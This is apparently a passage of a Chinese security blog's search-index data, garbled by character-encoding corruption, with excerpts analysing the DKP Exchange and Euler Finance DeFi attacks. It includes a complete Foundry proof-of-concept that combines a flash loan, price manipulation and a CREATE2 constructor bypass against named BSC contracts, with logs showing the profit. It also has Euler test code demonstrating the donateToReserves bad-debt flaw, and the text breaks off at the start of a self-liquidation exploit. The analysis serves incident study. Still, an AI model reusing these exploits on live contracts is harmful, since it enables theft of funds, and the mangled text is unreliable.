æ”»å‡»äº‹ä»¶åˆ†æ","uri":"/dpk-exchange-attack/"},{"categories":["security"],"content":"ä»·æ ¼æ“çºµ æ—¥å¸¸æ“ä½œ, åˆ©ç”¨é—ªç”µè´·åœ¨0x1201()æŸ¥è¯¢ä»·æ ¼æ—¶ç”¨åˆ°çš„PAIRä¸­å€Ÿèµ°ç»å¤§å¤šæ•°BUSD, ç”±äº0x1201()æ˜¯æŒ‰ç…§PAIRä¸­BUSDå’ŒDKPçš„ä½™é¢æ¯”ä¾‹æ¥è®¡ç®—ä»·æ ¼çš„, è¿™å°±å¯ä»¥è®©å…¶è®¡ç®—å‡ºDKP tokenä»·æ ¼å¼‚å¸¸\"ä¾¿å®œ\"(å¹¶ä¸æ˜¯è®©å¸‚åœºä¸Šçš„ä»·æ ¼å˜ä¾¿å®œ, è€Œæ˜¯è®©0x1201()è®¡ç®—å‡ºä¸€ä¸ªé”™è¯¯çš„å¾ˆä¾¿å®œçš„ä»·æ ¼), ç„¶åæ”»å‡»è€…å°±å¯ä»¥ç”¨å°‘é‡çš„BUSDè¿›è¡Œå¤§é‡ä¹°å…¥. ç„¶åå†åˆ°å¸‚åœºä¸Šä»¥æ­£å¸¸çš„ä»·æ ¼å–å‡ºè€Œè·åˆ©. ","date":"2023-03-24","objectID":"/dpk-exchange-attack/:3:1","tags":["defi"],"title":"DKP Exchange æ”»å‡»äº‹ä»¶åˆ†æ","uri":"/dpk-exchange-attack/"},{"categories":["security"],"content":"ç»•è¿‡åˆçº¦æ£€æŸ¥ ç”±äºexchangeå‡½æ•°ä¸­ require(msg.sender.code.size \u003c= 0, Error('no isContract')); æ¡ä»¶çš„é™åˆ¶, æ”»å‡»åˆçº¦æ˜¯ä¸èƒ½ç›´æ¥è°ƒç”¨exchangeå‡½æ•°çš„. ä½†æ˜¯, ä½¿ç”¨ä»£ç sizeæ˜¯å¦ä¸º0æ¥ä½œä¸ºè°ƒç”¨æ˜¯å¦æ¥è‡ªåˆçº¦çš„åˆ¤æ–­æ¡ä»¶æ˜¯æœ‰é—®é¢˜çš„. åˆçº¦åœ¨\"run time\"æ—¶ä»£ç sizeæ˜¯å¤§äº0çš„,ä½†åœ¨\"creation time\",ç”±äºåˆçº¦è¿˜æ­£åœ¨éƒ¨ç½²è¿‡ç¨‹ä¸­,æ‰€ä»¥å…¶code sizeè¿™æ—¶ä¸º0, è¦åœ¨\"creation time\"æ‰§è¡Œä»£ç é€»è¾‘,é‚£è‡ªç„¶å°±æ˜¯åˆçº¦çš„æ„é€ å‡½æ•°, æ‰€ä»¥åœ¨åˆçº¦çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨exchangeå‡½æ•°æ˜¯å¯ä»¥ç»•è¿‡ä¸Šé¢çš„æ¡ä»¶æ£€æŸ¥çš„. å…³äºè¿™ä¸ªé—®é¢˜å¯ä»¥å‚è€ƒ Ethernautç¬¬15ä¸ªæŒ‘æˆ˜é¢˜ç›® å¦å¤–ä¸€ä¸ªé—®é¢˜æ˜¯, è°ƒç”¨exchangeéœ€è¦é’±(å»ä¹°DKP), å¦‚ä½•åœ¨åˆçº¦è¿˜æ²¡éƒ¨ç½²å®Œæˆæ—¶å‘åˆçº¦è½¬è´¦,è®©å®ƒæœ‰é’±å‘¢. æ‰€ä»¥éœ€è¦äº‹å…ˆçŸ¥é“åˆçº¦çš„åœ°å€, å‘å…¶è½¬è´¦,ç„¶åå†éƒ¨ç½²åˆçº¦,éƒ¨ç½²åˆçº¦æ—¶å†å…¶æ„é€ å‡½æ•°ä¸­è¿›è¡Œexchangeè°ƒç”¨. è¿™å°±éœ€è¦ç”¨åˆ°Create2: https://github.com/yinhui1984/SolidityReference/blob/main/docs/new.md#create2 ","date":"2023-03-24","objectID":"/dpk-exchange-attack/:3:2","tags":["defi"],"title":"DKP Exchange æ”»å‡»äº‹ä»¶åˆ†æ","uri":"/dpk-exchange-attack/"},{"categories":["security"],"content":"POC // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.10; import \"forge-std/Test.sol\"; interface IERC20 { function balanceOf(address owner) external view returns (uint256); function approve(address spender, uint256 value) external returns (bool); function transfer(address to, uint256 value) external returns (bool); function decimals() external view returns (uint8); } interface IUniswapV2Pair { function swap( uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data ) external; } interface IRouter { function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external; } interface IDKPExchange { function exchange(uint256 amount) external; } IERC20 constant DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19); IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955); IUniswapV2Pair constant Pair = IUniswapV2Pair( 0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7 ); IRouter constant Router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); IDKPExchange constant DKPExchange = IDKPExchange( 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 ); contract RunAsNotContract { constructor() { BUSD.approve(address(DKPExchange), type(uint256).max); DKPExchange.exchange(100 * 10 ** BUSD.decimals()); BUSD.approve(address(DKPExchange), 0); DKP.transfer(msg.sender, DKP.balanceOf(address(this))); } } contract Hack is Test { uint256 flashAmount; bytes32 the_salt = bytes32(keccak256(\"the_salt_string\")); function setUp() public { vm.createSelectFork(\"theNet\", 26284131); deal(address(BUSD), address(this), 1000 * 10 ** BUSD.decimals()); } function testHack() public { emit log_named_decimal_uint( \"BUSD balance at the beginning\", BUSD.balanceOf(address(this)), BUSD.decimals() ); //å€Ÿèµ°PAIRä¸­çš„ç»å¤§éƒ¨åˆ†BUSDï¼Œè®©DKPå˜å¾—éå¸¸ä¾¿å®œ flashAmount = caculateSwapAmount(); Pair.swap(flashAmount, 0, address(this), abi.encode(flashAmount)); //å…‘æ¢BUSDï¼Œè´·æ¬¾å›è°ƒæ‰§è¡Œå®Œæˆåå†å…‘æ¢ï¼Œå¦åˆ™æŠ¥é”™\"Pancake: LOCKED\" DKP2BUSD(); emit log_named_decimal_uint( \"BUSD balance at the end\", BUSD.balanceOf(address(this)), BUSD.decimals() ); } function pancakeCall(address, uint256, uint256, bytes calldata) external { //ä¸èƒ½ç›´æ¥è°ƒç”¨,å…¶åˆ¤æ–­äº†è°ƒç”¨æ–¹æ˜¯å¦æ˜¯åˆçº¦ï¼Œå…¶åªå…è®¸EOAè¿›è¡Œexchange //DKPExchange.exchange(xxx); // æŠ¥é”™ï¼š \"no isContract\" //use this: address calcultedAddress = calculteSpecialContractAddress(); BUSD.transfer(calcultedAddress, 100 * 10 ** BUSD.decimals()); RunAsNotContract c = new RunAsNotContract{salt: the_salt}(); // exploit in constructor assert(address(c) == calcultedAddress); emit log_named_decimal_uint( \"DKP balance\", DKP.balanceOf(address(this)), DKP.decimals() ); //è¿˜è´·æ¬¾ uint256 returnAmount = (flashAmount * 10_000) / 9975 + 1000; BUSD.transfer(address(Pair), returnAmount); } function caculateSwapAmount() private returns (uint256) { uint256 b = BUSD.balanceOf(address(Pair)); emit log_named_decimal_uint(\"BUSD balance of Pair\", b, BUSD.decimals()); uint256 a = (b * 9992) / 10000; // 99.92 % emit log_named_decimal_uint(\"I will borrow out\", a, BUSD.decimals()); return a; } function calculteSpecialContractAddress() private view returns (address) { address predictedAddress = address( uint160( uint( keccak256( abi.encodePacked( bytes1(0xff), address(this), the_salt, keccak256( abi.encodePacked( type(RunAsNotContract).creationCode ) ) ) ) ) ) ); return predictedAddress; } function DKP2BUSD() private { DKP.approve(address(Router), type(uint256).max); address[] memory path = new address[](2); path[0] = address(DKP); path[1] = address(BUSD); Router.swapExactTokensForTokensSupportingFeeOnTransferTokens( DKP.balanceOf(address(this)), 0, path, address(this), block.timestamp ); DKP.approve(address(Router), 0); } } è¾“å‡º: [PASS] testHack() (gas: 520036) Logs: BUSD balance at the beginning: 1000.000000000000000000 BUSD balance of Pair: 259605.445236391899433885 I will borrow out: 259397.760880202785914337 DKP balance: 17666.042408805118459861 BUSD balance at the end: 81512.615981085813934882 ","date":"2023-03-24","objectID":"/dpk-exchange-attack/:4:0","tags":["defi"],"title":"DKP Exchange æ”»å‡»äº‹ä»¶åˆ†æ","uri":"/dpk-exchange-attack/"},{"categories":["security"],"content":"å»ä¸­å¿ƒåŒ–å»å®¡æ‰¹åŒ–å€Ÿè´·å¹³å°Eulerå‰ç«¯æ—¶é—´é­åˆ°æœ€ç³Ÿç³•çš„ä¸€ç³»åˆ—æ”»å‡»ã€‚è¿™é‡Œä»¥ä»¥å¤ªåŠä¸»é“¾16817996é«˜åº¦çš„ä¸€æ¬¡æ”»å‡»ä¸ºä¾‹ï¼Œçœ‹çœ‹è¿™ä¸ªé»‘å®¢æ˜¯å¦‚ä½•åˆ©ç”¨å…¶æ¼æ´å®æ–½æ”»å‡»å¹¶è·åˆ©çš„ ","date":"2023-03-22","objectID":"/euler-finance-attack/:0:0","tags":["defi"],"title":"Euler Finance é»‘å®¢æ”»å‡»åˆ†æ","uri":"/euler-finance-attack/"},{"categories":["security"],"content":"Euleråè®®å€Ÿè´·ç®€è¿° Euleråè®®å®ç°çš„æ˜¯æœ‰æŠµæŠ¼çš„å€Ÿè´·ï¼Œ ç”¨æˆ·å°†èµ„äº§ï¼ˆæ¯”å¦‚DAIï¼‰æŠµæŠ¼ç»™å¹³å°ï¼Œå¹³å°ä¼šå‘æ”¾è¯¥èµ„äº§å¯¹åº”çš„eTokenï¼ˆæ¯”å¦‚eDAIï¼‰ç»™ç”¨æˆ·ï¼Œå°±åƒå»èµŒåœºçš„æ—¶å€™ç»™é¡¾å®¢æ¢çš„ç­¹ç ä¸€æ ·ï¼Œé¡¾å®¢ç„¶åå°±å¯ä»¥å»æ„‰å¿«åœ°ç©è€äº†ï¼Œç©è€å®Œæˆåå†ç”¨eTokenèµå›æŠµæŠ¼çš„èµ„äº§ï¼ˆèµ¢äº†å¯ä»¥èµå›æ›´å¤šï¼Œè¾“äº†èµå›å¾—æ›´å°‘ï¼‰ã€‚ä½†ä¸èµŒåœºä¸åŒçš„æ˜¯ï¼ŒEuleré™¤äº†æœ‰è¡¨ç¤ºç­¹ç çš„eTokenå¤–ï¼Œè¿˜æœ‰è¡¨ç¤ºè´Ÿå€ºçš„dTokenï¼ˆæ¯”å¦‚dDAIï¼‰ã€‚ æ¯”å¦‚ï¼Œä½ æœ‰100ä¸ªeToken, 20ä¸ªdToken, é‚£ä¹ˆæœ€ç»ˆä½ å¯ä»¥é”€æ¯æ‰20ä¸ªeToken (eToken.burnå‡½æ•°)ï¼Œå…¶åœ¨é”€æ¯20ä¸ªeTokençš„åŒæ—¶ï¼Œä¹Ÿä¼šé”€æ¯æ‰å¯¹åº”20ä¸ªdTokenï¼Œæœ€ç»ˆä½ å‰©ä½™80ä¸ªeTokenï¼Œç”¨è¿™80ä¸ªeTokençš„å»æ¢å›éƒ¨åˆ†æˆ–æ›´å¤šçš„æŠµæŠ¼èµ„äº§ã€‚ åœ¨Eulerä¸­æ²¡æœ‰ä¼ ç»Ÿçš„é—ªç”µè´·ï¼Œä½†æœ‰ä¸€ä¸ªå‡½æ•°: eToken.mint() è¯¥å‡½æ•°å®ç°äº†å’Œé—ªç”µè´·ç›¸åŒçš„åŠŸèƒ½ï¼Œä½ å¯ä»¥è‡ªå·±è¿›è¡Œé“¸å¸ï¼Œé“¸é€ å®Œæˆåï¼Œä½ å°†æ”¶åˆ°ä¸€å®šæ•°é‡çš„eToken å’Œ å¯¹åº”æ•°é‡çš„ dToken(è´Ÿå€º)ã€‚è¿™å®é™…ä¸Šå°±æ˜¯è¿›è¡Œäº†ä¸€æ¬¡å€Ÿè´·ï¼šä½ æ‹¥æœ‰äº†æ›´å¤šçš„eTokenç­¹ç äº†ã€‚ è¦æˆåŠŸé€€å‡ºå€Ÿè´·åè®®ï¼Œä½ éœ€è¦å®Œæˆä¸šåŠ¡é€»è¾‘åï¼Œå°†ä½ çš„è´Ÿè½½æ¸…é›¶ï¼Œæ¸…é›¶æ–¹å¼æœ‰å¤šç§ï¼Œæ¯”å¦‚ä½ å¯ä»¥burn eTokenå»æ¶ˆé™¤è´Ÿè½½ï¼Œä¹Ÿå¯ä»¥èŠ±é’±ï¼ˆæ¯”å¦‚ä½¿ç”¨DAIï¼‰è°ƒç”¨repayå‡½æ•°å»æ¶ˆé™¤è´Ÿå€ºã€‚ åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œ ä½ çš„æ¯æ¬¡èµ„é‡‘æ“ä½œEuleréƒ½ä¼šæ£€æŸ¥ä½ çš„è´¢åŠ¡å¥åº·çŠ¶å†µï¼Œæ‰€è°“è´¢åŠ¡å¥åº·çŠ¶å†µå°±æ˜¯â€œèµ„å€ºå¹³è¡¡â€ï¼Œåœ¨ä½ æŠµæŠ¼èµ„äº§æ—¶ï¼Œå¹¶ä¸æ˜¯1:1ç»™ä½ eTokençš„ï¼Œè€Œæ˜¯æœ‰ä¸€å®šæ¯”ä¾‹ï¼Œå‚è€ƒç™½çš®ä¹¦ è¿™å°±å½¢æˆäº†ä¸€å®šçš„å®‰å…¨åŒºé—´ï¼Œå¦‚æœä½ çš„æ“ä½œå¾ˆå¯èƒ½ä½¿ä½ çš„è´¢åŠ¡çŠ¶å†µè¶…è¿‡è¿™ä¸ªå®‰å…¨åŒºé—´ï¼Œä½ çš„è´¢åŠ¡æ“ä½œä¼šè¢«revert, ä»¥ç¡®ä¿ä¸å½¢æˆåè´¦ã€‚ æ ¹æ®ç™½çš®ä¹¦ï¼šå½“ Euler ç”¨æˆ·çš„é£é™©è°ƒæ•´åè´Ÿå€ºè¶…è¿‡äº†é£é™©è°ƒæ•´åå€ºåŠ¡æ—¶ï¼Œå°±ä¼šè¢«è®¤ä¸ºâ€œè¿çº¦â€äº†ã€‚ä¸€ä¸ªå€Ÿæ¬¾äººåˆšåˆšè¿›å…¥â€œè¿çº¦â€çŠ¶æ€æ—¶ä¾ç„¶æœ‰è¶³é¢çš„æŠµæŠ¼æ¥å¿ä»˜å®ƒçš„è´·æ¬¾ï¼Œä½†æ˜¯ä¼šæœ‰è¢«è°ƒæ•´åˆ°å¯èƒ½æ— æ³•å¿ä»˜è´·æ¬¾çš„é£é™©ã€‚ç»“æœæ¥è¯´ï¼Œä¸ºäº†é˜²æ­¢ä»–ä»¬è¿çº¦ï¼Œå°±å¯èƒ½ä¼šå¯¹ä»–ä»¬è¿›è¡Œæ¸…ç®—ã€‚ æ¸…ç®—æ—¶å€ºåŠ¡ä¼šæ‰“æŠ˜é”€å”®ç»™æ¸…ç®—è€…ï¼Œå½“ç„¶ä½ çš„èµ„é‡‘ä¹Ÿä¼šè½¬ç§»ç»™æ¸…ç®—è€…ã€‚å…³é”®åœ¨è¿™ä¸ªæ‰“æŠ˜ï¼Œä¸ºäº†é¼“åŠ±æ¸…ç®—è€…ï¼Œå¦‚æœä½ è¿è§„å¾—è¶Šå‰å®³ï¼ˆå¥åº·åˆ†æ•°è¶Šä½ï¼‰æ‰“æŠ˜å°±è¶Šå‰å®³ã€‚ä½†å®é™…æƒ…å†µæ˜¯Elueråè®®ä¸ä¼šè®©ä½ çš„è´¢åŠ¡å¥åº·çŠ¶æ€å¤ªå·®ï¼Œè¿™å¾ˆå®¹æ˜“å½¢æˆå¤§é¢åè´¦ï¼Œæ‰€ä»¥ä½ æ¯æ¬¡çš„è´¢åŠ¡æ“ä½œä½ éƒ½ä¼šæ£€æŸ¥ä½ çš„è´¢åŠ¡å¥åº·çŠ¶æ€ï¼Œå¯èƒ½èµ„ä¸æŠµå€ºå°±revertï¼Œä¹Ÿå°±æ˜¯checkLiquidityå‡½æ•° ç¤ºä¾‹ä»£ç  // çœç•¥æ¥å£å®šä¹‰ // è¿è§„æµ‹è¯• contract ViolatorTest is Test { uint256 constant initialFunding = 80000 ether; function setUp() public { vm.createSelectFork(\"mainnet\", 16_817_995); } function checkHealth(address _who) private { //ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¸…ç®—è€…åœ°å€ï¼Œ ä¸èƒ½ä¼ è‡ªå·±ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š [FAIL. Reason: e/liq/self-liquidation] IEuler.LiquidationOpportunity memory returnData = Euler .checkLiquidation(address(0), _who, address(DAI), address(DAI)); emit log_named_decimal_uint(\"healthScore\", returnData.healthScore, 18); } function testViolate() public { deal(address(DAI), address(this), initialFunding); DAI.approve(address(EulerLiquidation), type(uint256).max); eDAI.deposit(0, 10000 ether); console2.log( \"i got eDAI after eDAI.deposit\", eDAI.balanceOf(address(this)) / 1 ether ); console2.log( \"i have dDAI after eDAI.deposit\", dDAI.balanceOf(address(this)) / 1 ether ); eDAI.mint(0, 50000 ether); console2.log( \"i have eDAI after eDAI.mint\", eDAI.balanceOf(address(this)) / 1 ether ); console2.log( \"i have dDAI after eDAI.mint\", dDAI.balanceOf(address(this)) / 1 ether ); //æ‰”æ‰ä¸€éƒ¨åˆ†eDAI eDAI.transfer(address(0), 100 ether); // æˆåŠŸ //æ£€æŸ¥è´¢åŠ¡å¥åº·çŠ¶å†µï¼Œå°äº1è¡¨ç¤ºèµ„ä¸æŠµå€º checkHealth(address(this)); //------------- // //å¹³è´¦æ–¹å¼2é€‰1 // //1. çƒ§æ‰è‡ªå·±çš„å’Œæ¬ æ¬¾æ•°é‡(dDAI)ç›¸ç­‰çš„eDAI(å¦‚æœè¿˜æœ‰é‚£ä¹ˆå¤šeDAIçš„è¯) // eDAI.burn(0, dDAI.balanceOf(address(this))); // //2.æˆ–èŠ±é’±ï¼ˆDAIï¼‰å¹³æ‰dDAI // // å¦‚æœæŠµæŠ¼æ¬¾ä¸è¶³ä»¥å¹³è´¦ï¼Œè‡ªå·±åˆä¸ä¸»åŠ¨å¹³è´¦ï¼Œè¿˜æƒ³withdraw // // ä¼šè¢«åˆ¤æ–­è¿çº¦ [FAIL. Reason: e/collateral-violation],æ‰§è¡Œé€»è¾‘ä¼šè¢«revert dDAI.repay(0, dDAI.balanceOf(address(this))); ////å¹³è´¦åèµå›æŠµæŠ¼ï¼ˆåªèƒ½èµå›ä¸€éƒ¨åˆ†äº†ï¼Œå¦å¤–ä¸€éƒ¨åˆ†è¢«æ‰”æ‰äº†ï¼‰ console2.log( \"i have eDAI after repay, i will withdraw them now\", eDAI.balanceOfUnderlying(address(this)) / 1 ether ); eDAI.withdraw(0, eDAI.balanceOfUnderlying(address(this))); console2.log( \"i have eDAI at the end\", eDAI.balanceOfUnderlying(address(this)) / 1 ether ); console2.log( \"i have dDAI at the end\", dDAI.balanceOf(address(this)) / 1 ether ); console2.log( \"i have DAI at the end\", DAI.balanceOf(address(this)) / 1 ether ); console2.log( \"i lost DAI in this game\", (initialFunding - DAI.balanceOf(address(this))) / 1 ether ); } } è¾“å‡º [PASS] testViolate() (gas: 568359) Logs: i got eDAI after eDAI.deposit 9784 i have dDAI after eDAI.deposit 0 i have eDAI after eDAI.mint 58704 i have dDAI after eDAI.mint 50000 healthScore: 1.123525638279678714 i have eDAI after repay, i will withdraw them now 59897 i have eDAI at the end 0 i have dDAI at the end 0 i have DAI at the end 79897 i lost DAI in this game 102 åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘æŠµæŠ¼äº†10000ä¸ªDAIï¼Œæ”¶åˆ°äº†9784ä¸ªeDAI, ç„¶åè´·æ¬¾50000ä¸ªeDAI, åˆæ‰”æ‰äº†100ä¸ªeDAIï¼Œç”±äºæˆ‘æŠµæŠ¼æ”¶åˆ°çš„eDAIä¸º9784ä¸ªè¿œå¤§äºæˆ‘æ‰”æ‰çš„100ä¸ªï¼Œç›¸å½“äºæˆ‘æ‰”æ‰çš„æ˜¯è‡ªå·±çš„é’±ï¼Œæ‰€ä»¥æˆ‘è¿™ä¸ªâ€œæ‰”æ‰æ“ä½œâ€é€šè¿‡äº†å¥åº·æ£€æŸ¥ï¼Œæ‰”æ‰ä»¥åå¥åº·åˆ†æ•°åŒæ ·å¾ˆé«˜ï¼ˆå¤§äº1è¡¨ç¤ºå¥åº·ï¼Œå°äº1è¡¨ç¤ºä¸å¥åº·ï¼‰ï¼Œè™½ç„¶äºäº†é’±ï¼Œä½†åœ¨Eulerçœ‹æ¥è¿™å±äºæ­£å¸¸æ“ä½œï¼ŒæˆåŠŸé€€å‡ºäº†åè®®ã€‚ ç›¸åçš„ï¼Œå¦‚æœæˆ‘æ‰§è¡Œä¸‹é¢æ“ä½œï¼š //æ‰”æ‰ä¸€éƒ¨åˆ†eDAI eDAI.transfer(address(0), 20000 ether); è¾“å‡º Compiler run successful Running 1 test for test/poc.t.sol:ViolatorTest [FAIL. Reason: e/collateral-violation] testViolate() (gas: 522373) Logs: i got eDAI after eDAI.deposit 9784 i have dDAI after eDAI.deposit 0 i have eDAI after eDAI.mint 58704 i have dDAI after eDAI.mint 50000 Test result: FAILED. 0 passed; 1 failed; finished in 668.29m","date":"2023-03-22","objectID":"/euler-finance-attack/:1:0","tags":["defi"],"title":"Euler Finance é»‘å®¢æ”»å‡»åˆ†æ","uri":"/euler-finance-attack/"},{"categories":["security"],"content":"æ¼æ´ æ‰“å¼€Eulerå®˜æ–¹çš„æºä»£ç , ä»¥ETokenä¸ºä¾‹: https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/EToken.sol å…¶åœ¨å„ç±»è´¢åŠ¡æ“ä½œä¸­ï¼ˆæ¯”å¦‚mint, burn, withdraw, transferç­‰ï¼‰ï¼Œéƒ½è°ƒç”¨äº†checkLiquidity(); function withdraw(uint subAccountId, uint amount) external nonReentrant { (address underlying, AssetStorage storage assetStorage, address proxyAddr, address msgSender) = CALLER(); address account = getSubAccount(msgSender, subAccountId); // ... // ... //!!! important !!! checkLiquidity(account); logAssetStatus(assetCache); } å…³äºæµåŠ¨æ€§æ£€æŸ¥çš„ç®—æ³•å‚è€ƒä»£ç : https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/RiskManager.sol#L290 å”¯ç‹¬åœ¨ donateToReserves() å‡½æ•°ä¸­æ²¡æœ‰è°ƒç”¨checkLiquidity();è¿›è¡Œè´¦æˆ·æµåŠ¨æ€§æ£€æŸ¥ function donateToReserves(uint subAccountId, uint amount) external nonReentrant { (address underlying, AssetStorage storage assetStorage, address proxyAddr, address msgSender) = CALLER(); address account = getSubAccount(msgSender, subAccountId); updateAverageLiquidity(account); emit RequestDonate(account, amount); AssetCache memory assetCache = loadAssetCache(underlying, assetStorage); uint origBalance = assetStorage.users[account].balance; uint newBalance; if (amount == type(uint).max) { amount = origBalance; newBalance = 0; } else { require(origBalance \u003e= amount, \"e/insufficient-balance\"); unchecked { newBalance = origBalance - amount; } } assetStorage.users[account].balance = encodeAmount(newBalance); assetStorage.reserveBalance = assetCache.reserveBalance = encodeSmallAmount(assetCache.reserveBalance + amount); emit Withdraw(assetCache.underlying, account, amount); //!!! æ³¨æ„æ˜¯åœ°å€0 emitViaProxy_Transfer(proxyAddr, account, address(0), amount); logAssetStatus(assetCache); } å…¶ä¸­ emitViaProxy_Transfer(proxyAddr, account, address(0), amount) å‡½æ•° function emitViaProxy_Transfer(address proxyAddr, address from, address to, uint value) internal FREEMEM { (bool success,) = proxyAddr.call(abi.encodePacked( uint8(3), keccak256(bytes('Transfer(address,address,uint256)')), bytes32(uint(uint160(from))), bytes32(uint(uint160(to))), value )); require(success, \"e/log-proxy-fail\"); } é‚£ä¹ˆdonateToReserves()è¿™ä¸ªå‡½æ•°çš„å«ä¹‰å°±æ˜¯ï¼šå…è®¸ä»»ä½•äººå°†è‡ªå·±çš„eTokenè½¬ç§»åˆ°åœ°å€0è¿›è¡Œé”€æ¯ã€‚ è¿™å°±å¯ä»¥è®©ç”¨æˆ·è½»æ˜“å½¢æˆåè´¦ ç¤ºä¾‹ï¼š // è¿è§„æµ‹è¯• contract ViolatorTest is Test { uint256 constant initialFunding = 80000 ether; function setUp() public { vm.createSelectFork(\"mainnet\", 16_817_995); } function checkHealth(address _who) private { //ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¸…ç®—è€…åœ°å€ï¼Œ ä¸èƒ½ä¼ è‡ªå·±ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š [FAIL. Reason: e/liq/self-liquidation] IEuler.LiquidationOpportunity memory returnData = Euler .checkLiquidation(address(0), _who, address(DAI), address(DAI)); emit log_named_decimal_uint(\"healthScore\", returnData.healthScore, 18); } function testViolate() public { deal(address(DAI), address(this), initialFunding); DAI.approve(address(EulerLiquidation), type(uint256).max); eDAI.deposit(0, 10000 ether); console2.log( \"i got eDAI after eDAI.deposit\", eDAI.balanceOf(address(this)) / 1 ether ); console2.log( \"i have dDAI after eDAI.deposit\", dDAI.balanceOf(address(this)) / 1 ether ); eDAI.mint(0, 50000 ether); console2.log( \"i have eDAI after eDAI.mint\", eDAI.balanceOf(address(this)) / 1 ether ); console2.log( \"i have dDAI after eDAI.mint\", dDAI.balanceOf(address(this)) / 1 ether ); //æ‰”æ‰ä¸€éƒ¨åˆ†eDAI eDAI.donateToReserves(0, 50000 ether); // æˆåŠŸ (æ²¡æœ‰æ£€æŸ¥è´¦æˆ·çš„æµåŠ¨æ€§) //æ£€æŸ¥è´¢åŠ¡å¥åº·çŠ¶å†µï¼Œå°äº1è¡¨ç¤ºèµ„ä¸æŠµå€ºï¼Œåªè¶Šå°å¥åº·çŠ¶å†µè¶Šç³Ÿç³•ï¼Œè¢«æ¸…ç®—æ—¶æ‰“æŠ˜è¶Šå‰å®³ checkHealth(address(this)); console2.log( \"i have eDAI at the end\", eDAI.balanceOfUnderlying(address(this)) / 1 ether ); console2.log( \"i have dDAI at the end\", dDAI.balanceOf(address(this)) / 1 ether ); console2.log( \"i have DAI at the end\", DAI.balanceOf(address(this)) / 1 ether ); console2.log( \"i lost DAI in this game\", (initialFunding - DAI.balanceOf(address(this))) / 1 ether ); } } è¾“å‡º [PASS] testViolate() (gas: 475552) Logs: i got eDAI after eDAI.deposit 9784 i have dDAI after eDAI.deposit 0 i have eDAI after eDAI.mint 58704 i have dDAI after eDAI.mint 50000 healthScore: 0.151828871132557943 i have eDAI at the end 8896 i have dDAI at the end 50","date":"2023-03-22","objectID":"/euler-finance-attack/:2:0","tags":["defi"],"title":"Euler Finance é»‘å®¢æ”»å‡»åˆ†æ","uri":"/euler-finance-attack/"},{"categories":["security"],"content":"æ¼æ´åˆ©ç”¨ ä¸Šé¢å±•ç¤ºæ¼æ´çš„ä»£ç ä¸­æˆ‘å¹¶æ²¡æœ‰å»å¹³è´¦ï¼Œæ²¡æœ‰è¿˜æ¬¾ä¹Ÿä¸èƒ½å–å›æŠµæŠ¼ç‰©ï¼Œè®©å¹³å°äº§ç”Ÿäº†åè´¦ï¼Œä½†æˆ‘ä¹ŸæŸå¤±äº†10000DAIï¼Œæ‰€ä»¥å…¶å®æ˜¯ä¸¤è´¥ä¿±ä¼¤çš„åœºé¢ã€‚ è¦åšåˆ°ç›ˆåˆ©ï¼š è¿è§„è€…å¤§é‡é€ æˆåè´¦ï¼Œç„¶åèººå¹³ï¼Œ ä¸è¿˜è´¦ä¹Ÿä¸å–å›æŠµæŠ¼ è‡ªå·±å……å½“æ¸…ç®—è€…ï¼Œå¯¹è¿è§„è€…è¿›è¡Œæ¸…ç®—ï¼Œå¹³å°ä¼šå°†è¿è§„è€…çš„å€ºåŠ¡ï¼ˆdDAIï¼‰åšæ‰“æŠ˜å¤„ç†ç§»äº¤ç»™æ¸…ç®—è€…ï¼ŒåŒæ—¶å°†è¿è§„è€…çš„eDAIä¹Ÿä¼šç§»äº¤ç»™æ¸…ç®—è€… åªè¦æ¸…ç®—è€…çš„è·åˆ©ï¼ˆeDAI å‡å» dDAIçš„å·®é¢ï¼‰ å¤§äº æœ€åˆè¿è§„è€…çš„æŠµæŠ¼é‡‘é¢åŠ ä¸Šå„ç§æ‰‹ç»­è´¹ï¼Œé‚£ä¹ˆæ€»ä½“è€Œè¨€å°±æ˜¯ç›ˆåˆ© å…·ä½“æ¸…ç®—ç®—æ³•å‚è€ƒï¼š https://github.com/euler-xyz/euler-contracts/blob/dfaa7788b17ac7c2a826a3ed242d7181998a778f/contracts/modules/Liquidation.sol#LL55C6-L55C6 æ³¨ï¼š æ¸…ç®—è€…éœ€è¦æ–°å»ºä¸€ä¸ªåˆçº¦ï¼Œä¸èƒ½å’Œè¿è§„è€…æ˜¯åŒä¸€ä¸ªåˆçº¦åœ°å€, å¦åˆ™ä¼šæŠ¥é”™ï¼še/liq/self-liquidation require(!isSubAccountOf(liqLocs.violator, liqLocs.liquidator), \"e/liq/self-liquidation\"); ç¤ºä¾‹ï¼š // è¿è§„è€… contract Violator { function DoSometingEvil() external { DAI.approve(address(EulerLiquidation), type(uint256).max); //è´¨æŠ¼ 1ä¸‡ eDAI.deposit(0, 10000 ether); //è´·æ¬¾ 19ä¸‡ eDAI.mint(0, 190000 ether); //æèµ 3ä¸‡8 eDAI.donateToReserves(0, 38000 ether); // æˆåŠŸ (æ²¡æœ‰æ£€æŸ¥è´¦æˆ·çš„æµåŠ¨æ€§) console2.log( \"[Violator] eDAI at the end\", eDAI.balanceOfUnderlying(address(this)) / 1 ether ); console2.log( \"[Violator] dDAI at the end\", dDAI.balanceOf(address(this)) / 1 ether ); console2.log( \"[Violator] DAI at the end\", DAI.balanceOf(address(this)) / 1 ether ); } } // æ¸…ç®—è€… // è¿™é‡Œçš„ is Test 